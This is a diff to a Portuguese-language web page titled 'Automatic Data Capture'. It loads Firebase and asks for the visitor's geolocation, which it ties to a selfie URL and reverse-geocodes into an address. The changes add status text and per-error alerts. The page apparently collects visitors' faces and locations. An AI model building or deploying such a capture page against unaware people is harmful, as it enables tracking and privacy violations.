@@ -29,12 +29,20 @@
       from { width: 0; }
       to { width: 100%; }
     }
+    #location-message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #555;
+    }
   </style>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
 </head>
 <body>
+  <h1>Captura Automática de Dados</h1>
+  <p id="location-message">Aguardando permissão para acessar sua localização...</p>
+
   <div id="loader">
     <div></div>
   </div>
@@ -151,17 +159,32 @@
     // Localização do usuário
     function getLocation(selfieUrl) {
       if (navigator.geolocation) {
-        alert('Será solicitado acesso à sua localização para concluir o processo.');
-        navigator.geolocation.getCurrentPosition(position => {
-          const { latitude, longitude } = position.coords;
-          getAddressFromCoordinates(latitude, longitude, selfieUrl);
-        }, error => {
-          hideLoader();
-          alert('Erro ao obter a localização: ' + error.message);
-        });
+        document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const { latitude, longitude } = position.coords;
+            getAddressFromCoordinates(latitude, longitude, selfieUrl);
+          },
+          error => {
+            hideLoader();
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                alert('Permissão de localização negada. Para continuar, ative a permissão nas configurações do navegador.');
+                break;
+              case error.POSITION_UNAVAILABLE:
+                alert('Não foi possível determinar sua localização. Verifique se o GPS está ativado.');
+                break;
+              case error.TIMEOUT:
+                alert('A solicitação de localização demorou demais para responder.');
+                break;
+              default:
+                alert('Erro desconhecido ao tentar acessar a localização.');
+            }
+          }
+        );
       } else {
         hideLoader();
-        alert('Geolocalização não é suportada pelo navegador.');
+        alert('Este navegador não suporta geolocalização.');
       }
     }
 
